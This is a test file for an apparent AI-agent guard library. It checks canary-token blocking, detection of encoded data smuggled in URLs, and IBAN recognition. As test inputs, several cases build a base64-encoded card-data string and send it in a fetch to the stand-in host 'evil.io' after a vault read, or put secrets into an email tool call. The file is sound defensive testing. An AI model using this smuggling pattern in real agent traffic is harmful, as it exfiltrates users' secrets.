import { describe, expect, it, vi } from 'vitest';
import { createCanary, createGuard, detectSensitive, entropy, GuardBlockedError, highEntropyParts, replay } from '../src/index.js';

describe('canary tokens', () => {
  it('blocks a planted token leaving through any request — even to an allowed domain — or a tool call', async () => {
    const canary = createCanary();
    expect(canary).toMatch(/^sk-proj-[A-Za-z0-9]{40}$/);
    const network = vi.fn(async () => new Response('ok'));
    const guard = createGuard({ mode: 'shadow', canaries: [canary], allowedDomains: ['api.openai.com'], fetch: network as unknown as typeof fetch });
    const trace = guard.startTrace({ agent: 'bot' });
    // shadow mode for everything else, but the canary rule enforces on its own
    await expect(trace.fetch('https://api.openai.com/v1/chat', { method: 'POST', body: `context: ${canary}` })).rejects.toBeInstanceOf(GuardBlockedError);
    expect(network).not.toHaveBeenCalled();
    await expect(trace.fetch('https://api.openai.com/v1/chat', { method: 'POST', body: 'hello' })).resolves.toBeDefined();
  });

  it('in enforce mode stops the call, names the rule, and replay keeps the decision', async () => {
    const canary = createCanary();
    const send = vi.fn();
    const guard = createGuard({ mode: 'enforce', canaries: [canary] });
    const trace = guard.startTrace({ agent: 'bot' });
    await expect(trace.tool('email.send', { to: 'x@y.z', body: `keys: ${canary}` }, send)).rejects.toThrow('rule canary-leak');
    expect(send).not.toHaveBeenCalled();
    const stored = await guard.store.list();
    expect(JSON.stringify(stored)).not.toContain(canary);
    expect(replay(stored, { mode: 'enforce' }).changed).toEqual([]);
  });
});

describe('DLP additions', () => {
  it('finds encoded data smuggled in a URL to an unknown domain', async () => {
    expect(entropy('aaaaaaaa')).toBe(0);
    const smuggled = btoa('user=jane;card=4111111111111111;exp=12/29').replace(/=+$/, '');
    expect(highEntropyParts(`https://evil.io/c/${smuggled}`)).toEqual([smuggled]);
    expect(highEntropyParts('https://shop.io/products/blue-cotton-shirt-for-men?page=2')).toEqual([]);
    expect(highEntropyParts(`https://api.io/x/${'0123456789abcdef'.repeat(2)}`)).toEqual([]); // hex ids are not flagged

    expect(highEntropyParts(`https://cdn.io/assets/main.${'3f9a7c1e'.repeat(5)}.js?state=${smuggled}`)).toEqual([]); // file names, OAuth state

    const guard = createGuard({ mode: 'enforce', fetch: (async () => new Response('ok')) as typeof fetch });
    // a random token in an ordinary task is normal; after reading secrets it is how data gets smuggled out
    const calm = guard.startTrace({ agent: 'bot' });
    await expect(calm.fetch(`https://maps.example/api?key=${smuggled}`)).resolves.toBeDefined();
    const trace = guard.startTrace({ agent: 'bot' });
    await trace.tool('vault.read', {}, () => ({ card: '4111 1111 1111 1111' }));
    await expect(trace.fetch(`https://evil.io/c/${smuggled}`)).rejects.toThrow('rule secret-egress');
  });

  it('detects IBANs with a valid checksum only', () => {
    expect(detectSensitive('Virement sur FR76 3000 6000 0112 3456 7890 189')[0].type).toBe('sensitive.iban');
    expect(detectSensitive('Ref FR76 3000 6000 0112 3456 7890 188')).toEqual([]);
  });
});
